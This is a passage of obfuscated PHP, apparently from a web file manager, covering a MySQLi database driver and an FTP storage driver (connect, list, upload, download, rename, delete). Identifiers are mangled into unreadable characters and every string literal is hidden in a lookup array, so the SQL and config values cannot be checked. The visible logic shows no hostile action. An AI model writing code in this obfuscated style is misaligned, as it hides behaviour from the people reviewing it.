think_exception(mysqli_connect_error()); } $ÂÁş•™Ô = $this->linkID[$‹£¸ş§]->server_version; $this->linkID[$‹£¸ş§]->query($ÓİºãğÀ[994] . think_config($ÓİºãğÀ[995]) . $ÓİºãğÀ[58]); if ($ÂÁş•™Ô > $ÓİºãğÀ[996]) { $this->linkID[$‹£¸ş§]->query($ÓİºãğÀ[997]); } $this->connected = !0; if (1 != think_config($ÓİºãğÀ[22])) { unset($this->config); } } return $this->linkID[$‹£¸ş§]; } public function free() { $this->queryID->free_result(); $this->queryID = null; } public function query($¢Ğã¯¡Õ) { $ù˜¨¤‡Ñ =& $_SERVER[ÓïÕü]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $¢Ğã¯¡Õ; if ($this->queryID) { $this->free(); } think_action_status($ù˜¨¤‡Ñ[23], 1); think_status($ù˜¨¤‡Ñ[24]); $this->queryID = $this->_linkID->query($¢Ğã¯¡Õ); if ($this->_linkID->more_results()) { while (($üĞ¥˜â— = $this->_linkID->next_result()) != NULL) { $üĞ¥˜â—->free_result(); } } $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = $this->queryID->num_rows; $this->numCols = $this->queryID->field_count; return $this->getAll(); } } public function execute($‡ È³Ò½) { $—À®ªº =& $_SERVER[ÓïÕü]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $‡ È³Ò½; if ($this->queryID) { $this->free(); } think_action_status($—À®ªº[25], 1); think_status($—À®ªº[24]); $¢ııÛóû = $this->_linkID->query($‡ È³Ò½); $this->debug(); if (!1 === $¢ııÛóû) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->affected_rows; $this->lastInsID = $this->_linkID->insert_id; return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if ($this->transTimes == 0) { $this->_linkID->autocommit(!1); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $ÖğñÕĞƒ = $this->_linkID->commit(); $this->_linkID->autocommit(!0); $this->transTimes = 0; if (!$ÖğñÕĞƒ) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $ä–ò—á = $this->_linkID->rollback(); $this->transTimes = 0; if (!$ä–ò—á) { $this->error(); return !1; } } return !0; } private function getAll() { $¥’¨Õ× = array(); if ($this->numRows > 0) { for ($Ï÷û¯­Ú = 0; $Ï÷û¯­Ú < $this->numRows; $Ï÷û¯­Ú++) { $¥’¨Õ×[$Ï÷û¯­Ú] = $this->queryID->fetch_assoc(); } $this->queryID->data_seek(0); } return $¥’¨Õ×; } public function getFields($ÂàìÑÍ) { $¼Áäè¨ =& $_SERVER[ÓïÕü]; $Éú„ú© = $this->query($¼Áäè¨[1001] . $this->parseKey($ÂàìÑÍ)); $˜›Îü” = array(); if ($Éú„ú©) { foreach ($Éú„ú© as $«§ÁË™½ => $ÇŸ®û¤) { $˜›Îü”[$ÇŸ®û¤[$¼Áäè¨[31]]] = array($¼Áäè¨[32] => $ÇŸ®û¤[$¼Áäè¨[31]], $¼Áäè¨[33] => $ÇŸ®û¤[$¼Áäè¨[34]], $¼Áäè¨[35] => (bool) ($ÇŸ®û¤[$¼Áäè¨[36]] === $¼Áäè¨[12]), $¼Áäè¨[37] => $ÇŸ®û¤[$¼Áäè¨[38]], $¼Áäè¨[39] => strtolower($ÇŸ®û¤[$¼Áäè¨[40]]) == $¼Áäè¨[41], $¼Áäè¨[42] => strtolower($ÇŸ®û¤[$¼Áäè¨[43]]) == $¼Áäè¨[44]); } } return $˜›Îü”; } public function getTables($”¢¸™¨ = '') { $Óğ¥›Ñ =& $_SERVER[ÓïÕü]; $¥¹±ïÎš = !empty($”¢¸™¨) ? $Óğ¥›Ñ[1003] . $”¢¸™¨ . $Óğ¥›Ñ[1004] : $Óğ¥›Ñ[1005]; $ĞüœŒÕş = $this->query($¥¹±ïÎš); $©ıÊ½°ã = array(); if ($ĞüœŒÕş) { foreach ($ĞüœŒÕş as $«½Æ»¤Ş => $–ÌşØ˜) { $©ıÊ½°ã[$«½Æ»¤Ş] = current($–ÌşØ˜); } } return $©ıÊ½°ã; } public function replace($“şôÎÆÂ, $Ø¾©¯´ª = array()) { $¤ããĞÍ„ =& $_SERVER[ÓïÕü]; foreach ($“şôÎÆÂ as $Å×ºëŠ” => $ªæå½‚») { $›„İ»Çë = $this->parseValue($ªæå½‚»); if (is_scalar($›„İ»Çë)) { $éÒÃçÒÍ[] = $›„İ»Çë; $íá‘ÈêÑ[] = $this->parseKey($Å×ºëŠ”); } } $Å£­àé¢ = $¤ããĞÍ„[1006] . $this->parseTable($Ø¾©¯´ª[$¤ããĞÍ„[359]]) . $¤ããĞÍ„[1007] . implode($¤ããĞÍ„[50], $íá‘ÈêÑ) . $¤ããĞÍ„[1008] . implode($¤ããĞÍ„[50], $éÒÃçÒÍ) . $¤ããĞÍ„[1009]; return $this->execute($Å£­àé¢); } public function insertAll($ìş–¢», $æ½íÈ¸Ÿ = array(), $‚Ìàòß = false) { $Îë“Áø¯ =& $_SERVER[ÓïÕü]; if (!is_array($ìş–¢»[0])) { return !1; } $Ì‘ŞÔøË = array_keys($ìş–¢»[0]); $•ö«åù = array(); foreach ($ìş–¢» as $ÏúÄ¡Õà) { $Ë»‡œúü = array(); foreach ($ÏúÄ¡Õà as $›ï„ò° => $Ô”À‰¿ô) { $Ô”À‰¿ô = $this->parseValue($Ô”À‰¿ô); if (is_scalar($Ô”À‰¿ô)) { $Ë»‡œúü[] = $Ô”À‰¿ô; } } $•ö«åù[] = $Îë“Áø¯[340] . implode($Îë“Áø¯[50], $Ë»‡œúü) . $Îë“Áø¯[1009]; } array_walk($Ì‘ŞÔøË, array($this, $Îë“Áø¯[1010])); $Ù‰ÓÏî = $‚Ìàòß ? $Îë“Áø¯[1011] : $Îë“Áø¯[1012]; $…å¯î¿‘ = $Ù‰ÓÏî . $Îë“Áø¯[1013] . $this->parseTable($æ½íÈ¸Ÿ[$Îë“Áø¯[359]]) . $Îë“Áø¯[1007] . implode($Îë“Áø¯[50], $Ì‘ŞÔøË) . $Îë“Áø¯[1014] . implode($Îë“Áø¯[50], $•ö«åù); return $this->execute($…å¯î¿‘); } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $¬Á¡ìŞ² =& $_SERVER[ÓïÕü]; $this->error = $this->_linkID->errno . $¬Á¡ìŞ²[4] . $this->_linkID->error; if ($¬Á¡ìŞ²[12] != $this->queryStr) { $this->error .= LNG($¬Á¡ìŞ²[48]) . $this->queryStr; } think_trace($this->error, $¬Á¡ìŞ²[12], $¬Á¡ìŞ²[49]); return $this->error; } public function escapeString($è¤ŸÆ¶ú) { if ($this->_linkID) { return $this->_linkID->real_escape_string($è¤ŸÆ¶ú); } else { return addslashes($è¤ŸÆ¶ú); } } public function parseKey(&$«€›¾íî, $Ñ‰ñå = true) { $±šÉŒº =& $_SERVER[ÓïÕü]; if ($Ñ‰ñå) { $«€›¾íî = $this->parseKeyCheck($«€›¾íî); } if ($«€›¾íî != $±šÉŒº[223] && !preg_match($±šÉŒº[1015], $«€›¾íî)) { $«€›¾íî = $±šÉŒº[464] . trim($«€›¾íî, $±šÉŒº[464]) . $±šÉŒº[464]; } return $«€›¾íî; } } goto då„…©³; dñ™ØÜ¨»Š: class PathDriverFTP extends PathDriverBase { private $server = ''; private $username = ''; private $userpass = ''; private $scheme = ''; private $host = ''; private $port = 21; private $connect = false; private $pasv = "\61"; public $config = array(); public function __construct($ğŒëä½Ñ) { parent::__construct(); if (count($ğŒëä½Ñ) > 0) { $this->_init($ğŒëä½Ñ); } } public function __destruct() { if (!$this->_isconn(!1)) { return !1; } return @ftp_close($this->connect); } private function charsetReset($æòœœÔÄ) { $½ç­Èê– =& $_SERVER[ÓïÕü]; global $config; $this->appCharset = $config[$½ç­Èê–[1474]]; $this->systemCharset = $config[$½ç­Èê–[1475]]; if (isset($æòœœÔÄ[$½ç­Èê–[1476]]) && $æòœœÔÄ[$½ç­Èê–[1476]]) { $this->systemCharset = $æòœœÔÄ[$½ç­Èê–[1476]]; } } public function iconvApp($“û•ü„ì) { return $this->iconvTo($“û•ü„ì, $this->systemCharset, $this->appCharset); } public function iconvSystem($ÚÓƒºÑ) { return $this->iconvTo($ÚÓƒºÑ, $this->appCharset, $this->systemCharset); } public function getPathOuter($Ÿ¦ù¥³±) { $ÓÈ«ÊÍ— =& $_SERVER[ÓïÕü]; $‰»‰ÚÚú = $this->iconvApp($this->pathBase); $Ÿ¦ù¥³± = $this->iconvApp($Ÿ¦ù¥³±); if (substr($‰»‰ÚÚú, 0, 2) == $ÓÈ«ÊÍ—[1446]) { $‰»‰ÚÚú = BASIC_PATH . substr($‰»‰ÚÚú, 2); } if (substr($Ÿ¦ù¥³±, 0, 2) == $ÓÈ«ÊÍ—[1446]) { $Ÿ¦ù¥³± = BASIC_PATH . substr($Ÿ¦ù¥³±, 2); } $‰»‰ÚÚú = KodIO::clear($‰»‰ÚÚú); $Ÿ¦ù¥³± = KodIO::clear($Ÿ¦ù¥³±); $Ÿ¦ù¥³± = substr($Ÿ¦ù¥³±, strlen($‰»‰ÚÚú)); if (empty($this->pathDriver)) { return $Ÿ¦ù¥³±; } return $this->pathDriver . $ÓÈ«ÊÍ—[8] . ltrim($Ÿ¦ù¥³±, $ÓÈ«ÊÍ—[8]); } private function _init($ññÈ‚Ñº = array()) { $ò•«×ıù =& $_SERVER[ÓïÕü]; if (!function_exists($ò•«×ıù[1477])) { throw new Exception(LNG($ò•«×ıù[1478])); } $this->config = $ññÈ‚Ñº; $this->charsetReset($ññÈ‚Ñº); foreach ($ññÈ‚Ñº as $Š…‡õ¤œ => $®½–»ù) { if (isset($this->{$Š…‡õ¤œ})) { $this->{$Š…‡õ¤œ} = $®½–»ù; } } return $this->_login($ññÈ‚Ñº); } private function _login($ã”ÔãŸ®) { $Á¹ü¢­© =& $_SERVER[ÓïÕü]; static $™º‡Ô¨ë = array(); $ïòâ¢åÃ = md5(json_encode($ã”ÔãŸ®)); if (isset($™º‡Ô¨ë[$ïòâ¢åÃ])) { foreach ($™º‡Ô¨ë[$ïòâ¢åÃ] as $œĞ“È => $Ñ–¼î°) { $this->{$œĞ“È} = $Ñ–¼î°; } return !0; } $‹ç£¹‰Ê = parse_url(trim($this->server, $Á¹ü¢­©[8])); $this->host = $‹ç£¹‰Ê[$Á¹ü¢­©[209]]; $©âèé¿ = isset($‹ç£¹‰Ê[$Á¹ü¢­©[208]]) && $‹ç£¹‰Ê[$Á¹ü¢­©[208]] == $Á¹ü¢­©[1479] ? !0 : !1; $this->scheme = $©âèé¿ ? $Á¹ü¢­©[1480] : $Á¹ü¢­©[1481]; $this->port = isset($‹ç£¹‰Ê[$Á¹ü¢­©[210]]) ? $‹ç£¹‰Ê[$Á¹ü¢­©[210]] : 21; $this->connect = @ftp_connect($this->host, $this->port, 30); if ($this->connect === !1) { $this->writeLog(LNG($Á¹ü¢­©[1482]) . $this->host . $Á¹ü¢­©[4] . $this->port, !0); return !1; } $¢áû™‡² = @ftp_login($this->connect, $this->username, $this->userpass); if (!$¢áû™‡²) { $this->writeLog(LNG($Á¹ü¢­©[1483]) . $this->username, !0); return !1; } $this->ftpPath = @ftp_pwd($this->connect); @ftp_chdir($this->connect, $Á¹ü¢­©[8]); @ftp_set_option($this->connect, FTP_USEPASVADDRESS, !1); $Í»ïóúù = $this->pasv == $Á¹ü¢­©[91] ? !0 : !1; @ftp_pasv($this->connect, $Í»ïóúù); $™º‡Ô¨ë[$ïòâ¢åÃ] = array($Á¹ü¢­©[1484] => $this->connect, $Á¹ü¢­©[209] => $this->host, $Á¹ü¢­©[208] => $this->scheme, $Á¹ü¢­©[210] => $this->port); return $¢áû™‡²; } private function _isconn($†ÓŸãÌ¶ = true) { if (is_resource($this->connect)) { return !0; } if (!$†ÓŸãÌ¶) { return !1; } return $this->_login($this->config); } public function mkfile($½¹š‘ª™, $÷†İ©ğÁ = '', $œãäó¬ = REPEAT_RENAME) { if ($this->setContent($½¹š‘ª™, $÷†İ©ğÁ)) { return $this->getPathOuter($½¹š‘ª™); } $this->writeLog(LNG($_SERVER[ÓïÕü][1485]), !0); return !1; } public function mkdir($óÜğäæ, $é¶¹˜Ä = REPEAT_SKIP) { $ìßÇÇôš =& $_SERVER[ÓïÕü]; if (!$óÜğäæ || $óÜğäæ == $ìßÇÇôš[8]) { return !0; } if (!$this->_isconn()) { return !1; } $óÜğäæ = $this->iconvSystem($óÜğäæ); if ($this->_isFolder($óÜğäæ) || @ftp_mkdir($this->connect, $óÜğäæ)) { return $this->getPathOuter($óÜğäæ); } if (!$this->mkdir($this->pathFather($óÜğäæ))) { return !1; } if ($óÜğäæ = @ftp_mkdir($this->connect, $óÜğäæ)) { return $this->getPathOuter($óÜğäæ); } $¾´Ñ±ÓÂ = __FUNCTION__ . $ìßÇÇôš[1486]; $this->writeLog($¾´Ñ±ÓÂ, !0); return !1; } public function copyFile($ùäÌ€ßª, $âü–Ì¯©) { if (!$this->_isconn()) { return !1; } $÷åõ„İ = $this->pathThis($this->iconvSystem($ùäÌ€ßª)); $‹²­­¤Ì = $this->tempFile($÷åõ„İ); $’Ğğ¯Õ„ = $this->iconvApp($‹²­­¤Ì); $this->download($ùäÌ€ßª, $’Ğğ¯Õ„); $í®¹ÅÙÒ = $this->upload($âü–Ì¯©, $’Ğğ¯Õ„); $this->tempFileRemve($‹²­­¤Ì); return $í®¹ÅÙÒ; } public function moveFile($Çì„ôŸâ, $ó¦ÙÍùÆ) { if (!$this->_isconn()) { return !1; } $Çì„ôŸâ = $this->iconvSystem($Çì„ôŸâ); $ó¦ÙÍùÆ = $this->iconvSystem($ó¦ÙÍùÆ); $¡¸¨¿ ğ = @ftp_rename($this->connect, $Çì„ôŸâ, $ó¦ÙÍùÆ); if (!$¡¸¨¿ ğ) { $this->writeLog(__FUNCTION__ . $_SERVER[ÓïÕü][1486], !0); return !1; } return $this->getPathOuter($ó¦ÙÍùÆ); } public function delFile($à¹çƒë‡) { if (!$this->_isconn()) { return !1; } $à¹çƒë‡ = $this->iconvSystem($à¹çƒë‡); $şÕ³Å = @ftp_delete($this->connect, $à¹çƒë‡); if (!$şÕ³Å) { $this->writeLog(__FUNCTION__ . $_SERVER[ÓïÕü][1486], !0); } return $şÕ³Å; } public function delFolder($­ÅãÔØÌ) { if (!$this->_isconn()) { return !1; } $this->listItemCache = !1; $æÊõ¥ = $üÇ€äÜ¿ = array(); $this->fileList($­ÅãÔØÌ, $æÊõ¥, $üÇ€äÜ¿, !0); $this->listItemCache = !0; foreach ($üÇ€äÜ¿ as $ˆá¯ªÜü) { $³ËÎãé = $this->iconvSystem($ˆá¯ªÜü[$_SERVER[ÓïÕü][32]]); $ªè”ãŒî = @ftp_delete($this->connect, $³ËÎãé); if (!$ªè”ãŒî) { return !1; } } foreach ($æÊõ¥ as $³ËÎãé) { $³ËÎãé = $this->iconvSystem($³ËÎãé); $ªè”ãŒî = @ftp_rmdir($this->connect, $³ËÎãé); if (!$ªè”ãŒî) { return !1; } } $­ÅãÔØÌ = $this->iconvSystem($­ÅãÔØÌ); return @ftp_rmdir($this->connect, $­ÅãÔØÌ); } public function rename($¨ùµˆ°®, $ˆ¸ŒÖ‚µ) { $¦Í§ñ³ú =& $_SERVER[ÓïÕü]; if (!$this->_isconn()) { return !1; } $†ÏÚÍ·¾ = $this->fileNameAuto($this->pathFather($¨ùµˆ°®), $ˆ¸ŒÖ‚µ); $†ÏÚÍ·¾ = $this->iconvSystem($†ÏÚÍ·¾); $¨ùµˆ°® = $this->iconvSystem($¨ùµˆ°®); $´‡Ü¿ğÂ = $this->pathFather($¨ùµˆ°®); $óî©üÃ = rtrim($´‡Ü¿ğÂ, $¦Í§ñ³ú[8]) . $¦Í§ñ³ú[8] . $†ÏÚÍ·¾; $‡Ğ·¸® = @ftp_rename($this->connect, $¨ùµˆ°®, $óî©üÃ); if (!$‡Ğ·¸®) { $this->writeLog(__FUNCTION__ . $¦Í§ñ³ú[1486], !0); return !1; } $óî©üÃ = $this->iconvApp($óî©üÃ); return $this->getPathOuter($óî©üÃ); } private function folderInfo($ßÆ´‘ıÚ, $Òšë¤ºÅ = false) { $é‚«³ƒ­ =& $_SERVER[ÓïÕü]; $¥Ğ„éú¯ = array($é‚«³ƒ­[32] => $this->pathThis($ßÆ´‘ıÚ), $é‚«³ƒ­[87] => $this->getPathOuter($é‚«³ƒ­[8] . $ßÆ´‘ıÚ), $é‚«³ƒ­[33] => $é‚«³ƒ­[78]); if ($Òšë¤ºÅ) { return $¥Ğ„éú¯; } $¥Ğ„éú¯[$é‚«³ƒ­[234]] = $¥Ğ„éú¯[$é‚«³ƒ­[88]] = 0; $¥Ğ„éú¯[$é‚«³ƒ­[235]] = $¥Ğ„éú¯[$é‚«³ƒ­[236]] = !0; return $¥Ğ„éú¯; } private function fileInfo($´§Ê˜©, $å€‡ÄÂè = false, $ËÒ·›˜Ä = array()) { $¹Îàô¶Ş =& $_SERVER[ÓïÕü]; $Â€†Õ•¾ = array($¹Îàô¶Ş[32] => $this->pathThis($´§Ê˜©), $¹Îàô¶Ş[87] => $this->getPathOuter($¹Îàô¶Ş[8] . $´§Ê˜©), $¹Îàô¶Ş[33] => $¹Îàô¶Ş[233], $¹Îàô¶Ş[79] => isset($ËÒ·›˜Ä[$¹Îàô¶Ş[79]]) ? $ËÒ·›˜Ä[$¹Îàô¶Ş[79]] : 0, $¹Îàô¶Ş[169] => $this->ext($´§Ê˜©)); if ($å€‡ÄÂè) { return $Â€†Õ•¾; } $Â€†Õ•¾[$¹Îàô¶Ş[234]] = $Â€†Õ•¾[$¹Îàô¶Ş[88]] = 0; $Â€†Õ•¾[$¹Îàô¶Ş[235]] = $Â€†Õ•¾[$¹Îàô¶Ş[236]] = !0; $Úç²¡šÌ = $this->iconvSystem($´§Ê˜©); $Â€†Õ•¾[$¹Îàô¶Ş[88]] = @ftp_mdtm($this->connect, $Úç²¡šÌ); if (empty($ËÒ·›˜Ä)) { $ËÒ·›˜Ä = $this->objectMeta($´§Ê˜©); if (!$ËÒ·›˜Ä) { return $Â€†Õ•¾; } } $Â€†Õ•¾[$¹Îàô¶Ş[79]] = $ËÒ·›˜Ä[$¹Îàô¶Ş[79]]; return $Â€†Õ•¾; } public function size($å§ŞİÙ‰) { $ È©ì­˜ = $this->objectMeta($å§ŞİÙ‰); return $ È©ì­˜ ? $ È©ì­˜[$_SERVER[ÓïÕü][79]] : 0; } public function info($ƒÒ¼ç×Ÿ) { if ($this->isFile($ƒÒ¼ç×Ÿ)) { return $this->fileInfo($ƒÒ¼ç×Ÿ, 0); } else { if ($this->isFolder($ƒÒ¼ç×Ÿ)) { return $this->folderInfo($ƒÒ¼ç×Ÿ); } } return !1; } private function fileList($Õ…ŠÁÃ, &$‹…à·éÄ, &$­Ûí½êÊ, $½ËŒ’²ó = false) { $Çè’İğ =& $_SERVER[ÓïÕü]; $Õ…ŠÁÃ = $this->iconvSystem($Õ…ŠÁÃ); if (!$this->isFolder($Õ…ŠÁÃ)) { return !1; } $Õ…ŠÁÃ = rtrim($Õ…ŠÁÃ, $Çè’İğ[8]) . $Çè’İğ[8]; check_abort(); $ÊÀ•¦ = @ftp_rawlist($this->connect, $Õ…ŠÁÃ); if (!$ÊÀ•¦) { $ÊÀ•¦ = array(); } $§À­Œ«€ = array($Çè’İğ[10] => 1, $Çè’İğ[1391] => 1); foreach ($ÊÀ•¦ as $à¥ËÎáñ) { $¤ò€Ç»Ø = $this->_listItem($à¥ËÎáñ); if ($¤ò€Ç»Ø[0] == $Çè’İğ[849]) { continue; } $õ†Ö¨‹« = $¤ò€Ç»Ø[8]; if (empty($õ†Ö¨‹«) && $õ†Ö¨‹« !== $Çè’İğ[231] || isset($§À­Œ«€[$õ†Ö¨‹«])) { continue; } $õ†Ö¨‹« = $this->iconvApp($Õ…ŠÁÃ . ltrim($õ†Ö¨‹«, $Çè’İğ[8])); $ ±•Ã²² = array($Çè’İğ[32] => $õ†Ö¨‹«, $Çè’İğ[33] => $Çè’İğ[233], $Çè’İğ[79] => $¤ò€Ç»Ø[4]); if (substr($à¥ËÎáñ, 0, 1) == $Çè’İğ[1487]) { $ ±•Ã²²[$Çè’İğ[33]] = $Çè’İğ[78]; $ ±•Ã²²[$Çè’İğ[79]] = 0; } $”Ñ·ó›Ÿ = $ ±•Ã²²[$Çè’İğ[33]] == $Çè’İğ[78] ? !0 : !1; $this->cacheMethodInfoSet($õ†Ö¨‹«, $”Ñ·ó›Ÿ, $ ±•Ã²²); if ($”Ñ·ó›Ÿ) { $‹…à·éÄ[] = $õ†Ö¨‹«; if ($½ËŒ’²ó) { $this->fileList($õ†Ö¨‹«, $‹…à·éÄ, $­Ûí½êÊ, $½ËŒ’²ó); } continue; } $­Ûí½êÊ[] = $ ±•Ã²²; } $this->cacheMethodInfoSet($Õ…ŠÁÃ, !0); } private function _listItem($á¦“–ãÁ) { if (empty($á¦“–ãÁ)) { return array(); } $†Ñ›­í† = preg_split($_SERVER[ÓïÕü][1488], $á¦“–ãÁ); if (count($†Ñ›­í†) <= 9) { return $†Ñ›­í†; } $†Ñ›­í†[8] = trim(substr($á¦“–ãÁ, strpos($á¦“–ãÁ, $†Ñ›­í†[7]) + strlen($†Ñ›­í†[7]))); return array_splice($†Ñ›­í†, 0, 9); } public function listPath($šŞß–õÊ, $¸Œ³ÇŞŒ = false) { $‹êÄöæÁ =& $_SERVER[ÓïÕü]; if (!$this->_isconn()) { return !1; } $›ïÒÓ´˜ = $°Ù…À¡Ğ = array(); $this->fileList($šŞß–õÊ, $›ïÒÓ´˜, $°Ù…À¡Ğ); foreach ($›ïÒÓ´˜ as $Ö½ ì¼š => $ñÁöóœÁ) { $›ïÒÓ´˜[$Ö½ ì¼š] = $this->folderInfo($ñÁöóœÁ, $¸Œ³ÇŞŒ); } foreach ($°Ù…À¡Ğ as $Ö½ ì¼š => $ñÁöóœÁ) { $°Ù…À¡Ğ[$Ö½ ì¼š] = $this->fileInfo($ñÁöóœÁ[$‹êÄöæÁ[32]], $¸Œ³ÇŞŒ, $ñÁöóœÁ); } return array($‹êÄöæÁ[85] => $›ïÒÓ´˜, $‹êÄöæÁ[86] => $°Ù…À¡Ğ); } public function has($í—í£èâ, $˜ß¢®Œ = false, $©ÁÙ›È¶ = true) { $äªŸ¬Ô =& $_SERVER[ÓïÕü]; $ˆ•Â£ãÑ = $±éöŠò = array(); $Ü¡Æ¹ˆÄ = $˜ß¢®Œ ? !0 : !1; $this->fileList($í—í£èâ, $ˆ•Â£ãÑ, $±éöŠò, $Ü¡Æ¹ˆÄ); if ($˜ß¢®Œ) { return array($äªŸ¬Ô[242] => count($±éöŠò), $äªŸ¬Ô[243] => count($ˆ•Â£ãÑ)); } if ($©ÁÙ›È¶) { if (count($±éöŠò)) { return !0; } } else { if (count($ˆ•Â£ãÑ)) { return !0; } } return !1; } public function listAll($ÖŠã¢íÄ) { $Â¹¥ÔÜÔ =& $_SERVER[ÓïÕü]; if (!$this->_isconn()) { return !1; } $äÒŠïğ» = $ïÅòÆğş = array(); $this->fileList($ÖŠã¢íÄ, $äÒŠïğ», $ïÅòÆğş, !0); $Ëåóò = array_to_keyvalue($ïÅòÆğş, $Â¹¥ÔÜÔ[32]); foreach ($äÒŠïğ» as $²½ù‰ü¶) { if (is_string($²½ù‰ü¶)) { $Ëåóò[$²½ù‰ü¶] = array($Â¹¥ÔÜÔ[79] => 0); } } return $this->listAllFiles($ÖŠã¢íÄ, $Ëåóò); } public function getContent($íÇëÉµ) { if (!$this->_isconn()) { return !1; } $íÇëÉµ = $this->iconvSystem($íÇëÉµ); return $this->fileSubstr($íÇëÉµ); } public function setContent($¬ËËú’À, $™¯†ï—ó = '') { if (!$this->_isconn()) { return !1; } $°¿‘ŸÀé = $this->pathThis($this->iconvSystem($¬ËËú’À)); $ˆ…šæš = $this->tempFile($°¿‘ŸÀé); file_put_contents($ˆ…šæš, $™¯†ï—ó); $ÉİÁıÚ = $this->upload($¬ËËú’À, $this->iconvApp($ˆ…šæš)); $this->tempFileRemve($ˆ…šæš); return $ÉİÁıÚ; } public function fileSubstr($¤äÛŠ«Ô, $–Ú™ğ„ö = 0, $Öü–åˆÖ = false) { if (!$this->_isconn()) { return !1; } return $this->ftpRequest($¤äÛŠ«Ô, $–Ú™ğ„ö, $Öü–åˆÖ); } private function ftpRequest($’Ë—ÔÌ…, $û­ºÈœ× = 0, $Ä‘¥ÀÌ¦ = false) { $”ãæË‚ =& $_SERVER[ÓïÕü]; $’Ë—ÔÌ… = $”ãæË‚[8] . ltrim(str_ltrim($’Ë—ÔÌ…, $this->ftpPath), $”ãæË‚[8]); $’Ë—ÔÌ… = $this->iconvSystem($’Ë—ÔÌ…); $Ÿ–óœÛ = $this->scheme . $this->host . $”ãæË‚[4] . $this->port; $ÁëÌ£¤ = curl_init(); curl_setopt($ÁëÌ£¤, CURLOPT_URL, $Ÿ–óœÛ . $this->pathEncode($’Ë—ÔÌ…)); curl_setopt($ÁëÌ£¤, CURLOPT_USERPWD, "{$this->username}\x3a{$this->userpass}"); if ($Ä‘¥ÀÌ¦) { $Ó·ã½şÇ = $û­ºÈœ× + $Ä‘¥ÀÌ¦ - 1; curl_setopt($ÁëÌ£¤, CURLOPT_RANGE, "{$û­ºÈœ×}\55{$Ó·ã½şÇ}"); } curl_setopt($ÁëÌ£¤, CURLOPT_RETURNTRANSFER, 1); $™¯Ì®Ç€ = curl_exec($ÁëÌ£¤); curl_close($ÁëÌ£¤); return $™¯Ì®Ç€; } public function upload($¯ÃëÛ÷Û, $¦¾ÊÒ„›, $µèî½ôí = false, $–¿ØËŸ¬ = REPEAT_REPLACE) { if (!$this->_isconn()) { return !1; } if (!$this->mkdir($this->pathFather($¯ÃëÛ÷Û))) { return !1; } $¯ÃëÛ÷Û = $this->iconvSystem($¯ÃëÛ÷Û); $¦¾ÊÒ„› = $this->iconvSystem($¦¾ÊÒ„›); $…¥¸şÜ = ftp_nb_put($this->connect, $¯ÃëÛ÷Û, $¦¾ÊÒ„›, FTP_BINARY); while ($…¥¸şÜ == FTP_MOREDATA) { $…¥¸şÜ = ftp_nb_continue($this->connect); } if ($…¥¸şÜ != FTP_FINISHED) { $this->writeLog(__FUNCTION__ . $_SERVER[ÓïÕü][1486], !0); return !1; } return $this->getPathOuter($¯ÃëÛ÷Û); } public function download($şšæ÷š©, $Üğ©Ò‰Œ = '') { if (!$this->_isconn()) { return !1; } $á——Õ = $this->pathFather($Üğ©Ò‰Œ); if (!IO::mkdir($á——Õ)) { return !1; } $şšæ÷š© = $this->iconvSystem($şšæ÷š©); $Üğ©Ò‰Œ = $this->iconvSystem($Üğ©Ò‰Œ); $Ê‚ëÖÂ³ = ftp_nb_get($this->connect, $Üğ©Ò‰Œ, $şšæ÷š©, FTP_BINARY); while ($Ê‚ëÖÂ³ == FTP_MOREDATA) { $Ê‚ëÖÂ³ = ftp_nb_continue($this->connect); } if ($Ê‚ëÖÂ³ != FTP_FINISHED) { $this->writeLog(__FUNCTION__ . $_SERVER[ÓïÕü][1486], !0); return !1; } return $this->iconvApp($Üğ©Ò‰Œ); } public function exist($”‹ò•Ü©) { return $this->isFile($”‹ò•Ü©) || $this->isFolder($”‹ò•Ü©); } public function isFile($·˜‘âó) { return !$this->isFolder($·˜‘âó) && $this->objectMeta($·˜‘âó); } public function isFolder($·ÙÄ–®) { return $this->cacheMethod($_SERVER[ÓïÕü][180], $·ÙÄ–®); } protected function objectMeta($®Á×†Æ) { return $this->cacheMethod($_SERVER[ÓïÕü][182], $®Á×†Æ); } protected function _objectMeta($¦İÆÌˆı) { $ŞÉ¬…Ş¼ =& $_SERVER[ÓïÕü]; if ($¦İÆÌˆı == $ŞÉ¬…Ş¼[12] || $¦İÆÌˆı == $ŞÉ¬…Ş¼[8]) { return array(); } if (!$this->_isconn()) { return !1; } $¦İÆÌˆı = $this->iconvSystem($¦İÆÌˆı); $ÌÛÆâ¨Ç = array($ŞÉ¬…Ş¼[32] => $this->iconvApp($¦İÆÌˆı), $ŞÉ¬…Ş¼[33] => $ŞÉ¬…Ş¼[233], $ŞÉ¬…Ş¼[79] => 0); $ Ÿ˜·µ× = @ftp_size($this->connect, $¦İÆÌˆı); if ($ Ÿ˜·µ× != -1) { $ÌÛÆâ¨Ç[$ŞÉ¬…Ş¼[79]] = $ Ÿ˜·µ×; } else { $¿‚¨ÓÛı = @ftp_chdir($this->connect, $¦İÆÌˆı); if (!$¿‚¨ÓÛı) { return !1; } @ftp_chdir($this->connect, $ŞÉ¬…Ş¼[8]); $ÌÛÆâ¨Ç[$ŞÉ¬…Ş¼[33]] = $ŞÉ¬…Ş¼[78]; } return $ÌÛÆâ¨Ç; } protected function _isFolder($¢¼À«¯¼) { $¡æÛ½—¥ =& $_SERVER[ÓïÕü]; if ($¢¼À«¯¼ == $¡æÛ½—¥[12] || $¢¼À«¯¼ == $¡æÛ½—¥[8]) { return !0; } $ßŸæîË = $this->_objectMeta($¢¼À«¯¼); return isset($ßŸæîË[$¡æÛ½—¥[33]]) && $ßŸæîË[$¡æÛ½—¥[33]] == $¡æÛ½—¥[78] ? !0 : !1; } } class PathDriverJOS extends PathDriverBaseS3 { public function __construct($ÕÕÖÚÀ) { parent::__construct($ÕÕÖÚÀ); $this->setSignVersion($_SERVER[ÓïÕü][250]); } public function uploadLink($ıÉÕüÑ, $ä÷Ç§ò« = 0) { $è‰£Å =& $_SERVER[ÓïÕü]; if ($this->isUploadServer()) { return; } $¬¶’ = $this->getType(); if (!in_array($¬¶’, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $ïÎ£Ì³Ò = (!$ä÷Ç§ò« ? 1 : 